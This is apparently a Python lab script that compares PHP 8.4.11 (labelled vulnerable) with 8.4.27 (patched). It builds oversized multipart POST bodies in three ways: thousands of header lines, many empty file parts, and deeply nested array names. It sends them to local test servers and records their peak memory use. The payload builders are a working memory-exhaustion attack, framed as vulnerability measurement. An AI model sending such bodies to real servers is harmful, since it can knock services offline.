#!/usr/bin/env python3
"""Ukur amplifikasi memori multipart antara PHP 8.4.11 (vulnerable) dan 8.4.27 (patched).

Mengirim POST multipart dan membaca PEAK= yang dilaporkan info.php.
"""
import os
import re
import socket
import sys

LAB = os.path.dirname(os.path.abspath(__file__))


def build_body(strategy, n, boundary="----BB"):
    p = []
    if strategy == "headers":
        p.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\r\n"
                 + "".join("X:\r\n" for _ in range(n)) + "\r\nx\r\n")
    elif strategy == "emptyfile":
        for i in range(n):
            p.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"f{i}\"; filename=\"\"\r\n"
                     f"Content-Type: application/octet-stream\r\n\r\n\r\n")
    elif strategy == "nested":
        p.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"a" + "[b]" * n + "\"\r\n\r\nv\r\n")
    p.append(f"--{boundary}--\r\n")
    return "".join(p).encode()


def post(port, body):
    head = (f"POST /info.php HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n"
            f"Content-Type: multipart/form-data; boundary=----BB\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n")
    s = socket.create_connection(("127.0.0.1", port), timeout=120)
    s.settimeout(120)
    s.sendall(head.encode() + body)
    data = b""
    while True:
        b = s.recv(65536)
        if not b:
            break
        data += b
    s.close()
    return data.decode(errors="replace")


def parse(resp):
    st = resp.split("\r\n")[0]
    peak = re.search(r"PEAK_USED=(\d+)", resp)
    files = re.search(r"FILES=(\d+)", resp)
    return st, (int(peak.group(1)) if peak else None), (int(files.group(1)) if files else None)


if __name__ == "__main__":
    strategy = sys.argv[1] if len(sys.argv) > 1 else "emptyfile"
    ns = [int(x) for x in (sys.argv[2] if len(sys.argv) > 2 else "1000,5000,10000").split(",")]
    print(f"{'strategy':10s} {'n':>8s} {'wireMB':>8s} | {'8.4.11 vuln (PEAK_USED)':>26s} | {'8.4.27 patched (PEAK_USED)':>28s}")
    print("-" * 96)
    for n in ns:
        body = build_body(strategy, n)
        row = []
        for port in (8091, 8092):
            try:
                st, peak, files = parse(post(port, body))
                row.append(f"{st.split(' ',1)[1][:18]:18s} {peak}")
            except Exception as e:  # noqa: BLE001
                row.append(f"ERR {e}")
        print(f"{strategy:10s} {n:>8d} {len(body)/1048576:>8.2f} | {row[0]:>22s} | {row[1]:>22s}")
